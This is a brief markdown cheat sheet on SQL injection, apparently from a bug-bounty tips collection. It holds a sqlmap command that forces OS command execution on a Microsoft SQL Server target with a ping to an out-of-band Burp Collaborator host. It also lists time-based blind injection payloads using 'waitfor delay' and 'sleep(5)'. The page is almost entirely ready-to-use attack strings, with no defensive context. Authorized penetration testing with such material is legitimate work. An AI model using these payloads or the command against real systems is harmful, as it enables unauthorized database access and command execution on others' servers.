<h1 align="center">SQLI --> SQL Injection</h1>
<h3>1</h3>
<a href="https://twitter.com/hackersden_/status/1465229358545526787"><img align="center" width="550" height="600px" align="left" src="https://user-images.githubusercontent.com/79082257/143884335-9adfa71d-7b23-49b7-9afb-996e800d1c68.png"/></a>

Run

```bash
  sqlmap -r request.txt --force-ssl -p pramater --level 5 --risk 2 -dbms="Microsoft SQL Server" --os-cmd="ping http://your.burpcollaborator.net"
```


<a href="https://twitter.com/GodfatherOrwa/status/1439247081655447566"><img width="550" height="700px" align="center" src="https://user-images.githubusercontent.com/79082257/143886364-f03183e1-5922-4b79-9002-a04bfa55c56a.png"/></a>

Payloads
```
   ')) or sleep(5)='
   ;waitfor delay '0:0:5'--
   );waitfor delay '0:0:5'--
   ';waitfor delay '0:0:5'--
   ";waitfor delay '0:0:5'--
   ');waitfor delay '0:0:5'--
   ");waitfor delay '0:0:5'--
   ));waitfor delay '0:0:5'--
```
